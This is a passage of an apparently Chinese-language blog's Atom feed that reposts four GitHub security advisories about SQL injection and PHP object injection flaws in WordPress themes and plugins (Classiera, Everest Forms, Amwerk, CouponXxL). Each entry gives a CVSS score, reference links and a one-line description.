    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-gqpr-crmw-v8qw">https://github.com/advisories/GHSA-gqpr-crmw-v8qw</a></p><p><strong>CVSS 评分：</strong> 9.3</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52722">https://nvd.nist.gov/vuln/detail/CVE-2025-52722</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/theme/classiera/vulnerability/wordpress-classiera-4-0-34-sql-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/theme/classiera/vulnerability/wordpress-classiera-4-0-34-sql-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-gqpr-crmw-v8qw">https://github.com/advisories/GHSA-gqpr-crmw-v8qw</a></p></li></ul><p><strong>描述：</strong></p><p>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in JoinWebs Classiera allows SQL Injection. This issue affects Classiera: from n&#x2F;a through 4.0.34.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-gqpr-crmw-v8qw&quot;&gt;https://github.com/advisories/GHSA-gqpr-crmw-v8qw&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Deserialization of Untrusted Data vulnerability in wpeverest Everest Forms allows Object</title>
    <link href="http://example.com/2025/06/27/github_3110947770/"/>
    <id>http://example.com/2025/06/27/github_3110947770/</id>
    <published>2025-06-27T13:00:12.310Z</published>
    <updated>2025-06-27T13:00:12.308Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-gvc8-gf46-mjvf">https://github.com/advisories/GHSA-gvc8-gf46-mjvf</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52709">https://nvd.nist.gov/vuln/detail/CVE-2025-52709</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-3-2-2-php-object-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-3-2-2-php-object-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-gvc8-gf46-mjvf">https://github.com/advisories/GHSA-gvc8-gf46-mjvf</a></p></li></ul><p><strong>描述：</strong></p><p>Deserialization of Untrusted Data vulnerability in wpeverest Everest Forms allows Object Injection. This issue affects Everest Forms: from n&#x2F;a through 3.2.2.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-gvc8-gf46-mjvf&quot;&gt;https://github.com/advisories/GHSA-gvc8-gf46-mjvf&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Deserialization of Untrusted Data vulnerability in BoldThemes Amwerk allows Object Injection</title>
    <link href="http://example.com/2025/06/27/github_3361787495/"/>
    <id>http://example.com/2025/06/27/github_3361787495/</id>
    <published>2025-06-27T13:00:10.928Z</published>
    <updated>2025-06-27T13:00:10.928Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-p7qf-74jx-f6jj">https://github.com/advisories/GHSA-p7qf-74jx-f6jj</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52724">https://nvd.nist.gov/vuln/detail/CVE-2025-52724</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/theme/amwerk/vulnerability/wordpress-amwerk-1-2-0-php-object-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/theme/amwerk/vulnerability/wordpress-amwerk-1-2-0-php-object-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-p7qf-74jx-f6jj">https://github.com/advisories/GHSA-p7qf-74jx-f6jj</a></p></li></ul><p><strong>描述：</strong></p><p>Deserialization of Untrusted Data vulnerability in BoldThemes Amwerk allows Object Injection. This issue affects Amwerk: from n&#x2F;a through 1.2.0.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-p7qf-74jx-f6jj&quot;&gt;https://github.com/advisories/GHSA-p7qf-74jx-f6jj&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Deserialization of Untrusted Data vulnerability in pebas CouponXxL allows Object Injection This</title>
    <link href="http://example.com/2025/06/27/github_1319416698/"/>
    <id>http://example.com/2025/06/27/github_1319416698/</id>
    <published>2025-06-27T13:00:09.468Z</published>
    <updated>2025-06-27T13:00:09.468Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-cf6j-797q-26f6">https://github.com/advisories/GHSA-cf6j-797q-26f6</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52725">https://nvd.nist.gov/vuln/detail/CVE-2025-52725</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/theme/couponxxl/vulnerability/wordpress-couponxxl-3-0-0-php-object-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/theme/couponxxl/vulnerability/wordpress-couponxxl-3-0-0-php-object-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-cf6j-797q-26f6">https://github.com/advisories/GHSA-cf6j-797q-26f6</a></p></li></ul><p><strong>描述：</strong></p><p>Deserialization of Untrusted Data vulnerability in pebas CouponXxL allows Object Injection. This issue affects CouponXxL: from n&#x2F;a through 3.0.0.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-cf6j-797q-26f6&quot;&gt;https://github.com/advisories/GHSA-cf6j-797q-26f6&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
</feed>
